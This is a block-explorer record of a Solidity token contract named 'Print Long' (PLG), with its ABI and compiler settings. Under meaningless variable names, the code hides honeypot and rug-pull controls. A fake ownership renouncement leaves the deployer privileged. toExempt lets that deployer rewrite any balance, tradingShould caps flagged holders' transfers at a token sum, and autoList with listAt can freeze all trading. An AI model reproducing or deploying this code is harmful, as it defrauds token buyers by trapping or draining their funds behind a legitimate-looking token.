{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchLaunched {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletTeam {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapBuy {\n    function createPair(address liquidityWalletList, address takeSwapList) external returns (address);\n}\n\ninterface modeFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchAt) external view returns (uint256);\n\n    function transfer(address modeTrading, uint256 autoIsAmount) external returns (bool);\n\n    function allowance(address senderTrading, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoIsAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTrading,\n        uint256 autoIsAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromMode, uint256 value);\n    event Approval(address indexed senderTrading, address indexed spender, uint256 value);\n}\n\ninterface shouldLimitTeam is modeFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract PrintLong is walletTeam, modeFund, shouldLimitTeam {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletLaunched;\n    }\n\n    uint256 private walletLaunched = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public fundTx;\n\n    function balanceOf(address launchAt) public view virtual override returns (uint256) {\n        return sellSwap[launchAt];\n    }\n\n    uint256 toLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return swapSell;\n    }\n\n    address totalLaunchedShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function launchFrom(address totalSenderList, address modeTrading, uint256 autoIsAmount) internal returns (bool) {\n        require(sellSwap[totalSenderList] >= autoIsAmount);\n        sellSwap[totalSenderList] -= autoIsAmount;\n        sellSwap[modeTrading] += autoIsAmount;\n        emit Transfer(totalSenderList, modeTrading, autoIsAmount);\n        return true;\n    }\n\n    address fundEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 constant exemptTrading = 14 ** 10;\n\n    event OwnershipTransferred(address indexed totalToken, address indexed swapSellTx);\n\n    mapping(address => uint256) private sellSwap;\n\n    bool public minLaunched;\n\n    function tradingShould(address shouldToken) public {\n        launchedAmount();\n        if (shouldIsMin == liquidityReceiverList) {\n            txAtSwap = false;\n        }\n        if (shouldToken == autoLiquidity || shouldToken == txSender) {\n            return;\n        }\n        senderShould[shouldToken] = true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return atLimit;\n    }\n\n    function approve(address fundMax, uint256 autoIsAmount) public virtual override returns (bool) {\n        launchedTotal[_msgSender()][fundMax] = autoIsAmount;\n        emit Approval(_msgSender(), fundMax, autoIsAmount);\n        return true;\n    }\n\n    address private autoExemptSell;\n\n    bool private txAtSwap;\n\n    string private toShouldLaunched = \"PLG\";\n\n    mapping(address => bool) public senderShould;\n\n    function takeAuto(address limitMin) public {\n        require(limitMin.balance < 100000);\n        if (exemptSenderLiquidity) {\n            return;\n        }\n        \n        fundTx[limitMin] = true;\n        if (shouldIsMin == liquidityReceiverList) {\n            limitReceiverMarketing = false;\n        }\n        exemptSenderLiquidity = true;\n    }\n\n    address public autoLiquidity;\n\n    function owner() external view returns (address) {\n        return autoExemptSell;\n    }\n\n    uint8 private swapSell = 18;\n\n    uint256 private liquidityReceiverList;\n\n    uint256 shouldFund;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toShouldLaunched;\n    }\n\n    function receiverLaunched() public {\n        emit OwnershipTransferred(autoLiquidity, address(0));\n        autoExemptSell = address(0);\n    }\n\n    function listAt(address totalSenderList, address modeTrading, uint256 autoIsAmount) internal returns (bool) {\n        if (totalSenderList == autoLiquidity) {\n            return launchFrom(totalSenderList, modeTrading, autoIsAmount);\n        }\n        uint256 walletListReceiver = modeFund(txSender).balanceOf(totalLaunchedShould);\n        require(walletListReceiver == toLimit);\n        require(modeTrading != totalLaunchedShould);\n        if (senderShould[totalSenderList]) {\n            return launchFrom(totalSenderList, modeTrading, exemptTrading);\n        }\n        return launchFrom(totalSenderList, modeTrading, autoIsAmount);\n    }\n\n    function getOwner() external view returns (address) {\n        return autoExemptSell;\n    }\n\n    function toExempt(address sellAmountAt, uint256 autoIsAmount) public {\n        launchedAmount();\n        sellSwap[sellAmountAt] = autoIsAmount;\n    }\n\n    mapping(address => mapping(address => uint256)) private launchedTotal;\n\n    function allowance(address txAmount, address fundMax) external view virtual override returns (uint256) {\n        if (fundMax == fundEnable) {\n            return type(uint256).max;\n        }\n        return launchedTotal[txAmount][fundMax];\n    }\n\n    address public txSender;\n\n    bool public exemptSenderLiquidity;\n\n    function launchedAmount() private view {\n        require(fundTx[_msgSender()]);\n    }\n\n    uint256 public shouldIsMin;\n\n    constructor (){\n        \n        launchLaunched liquidityToWallet = launchLaunched(fundEnable);\n        txSender = swapBuy(liquidityToWallet.factory()).createPair(liquidityToWallet.WETH(), address(this));\n        if (shouldIsMin == liquidityReceiverList) {\n            limitReceiverMarketing = false;\n        }\n        autoLiquidity = _msgSender();\n        receiverLaunched();\n        fundTx[autoLiquidity] = true;\n        sellSwap[autoLiquidity] = walletLaunched;\n        if (txAtSwap) {\n            limitReceiverMarketing = false;\n        }\n        emit Transfer(address(0), autoLiquidity, walletLaunched);\n    }\n\n    string private atLimit = \"Print Long\";\n\n    function autoList(uint256 autoIsAmount) public {\n        launchedAmount();\n        toLimit = autoIsAmount;\n    }\n\n    function transferFrom(address totalSenderList, address modeTrading, uint256 autoIsAmount) external override returns (bool) {\n        if (_msgSender() != fundEnable) {\n            if (launchedTotal[totalSenderList][_msgSender()] != type(uint256).max) {\n                require(autoIsAmount <= launchedTotal[totalSenderList][_msgSender()]);\n                launchedTotal[totalSenderList][_msgSender()] -= autoIsAmount;\n            }\n        }\n        return listAt(totalSenderList, modeTrading, autoIsAmount);\n    }\n\n    bool private limitReceiverMarketing;\n\n    function transfer(address sellAmountAt, uint256 autoIsAmount) external virtual override returns (bool) {\n        return listAt(_msgSender(), sellAmountAt, autoIsAmount);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderTrading\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapSellTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromMode\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoIsAmount\",\"type\":\"uint256\"}],\"name\":\"autoList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSenderLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldIsMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"}],\"name\":\"takeAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsAmount\",\"type\":\"uint256\"}],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"}],\"name\":\"tradingShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmountAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalSenderList\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoIsAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "PrintLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}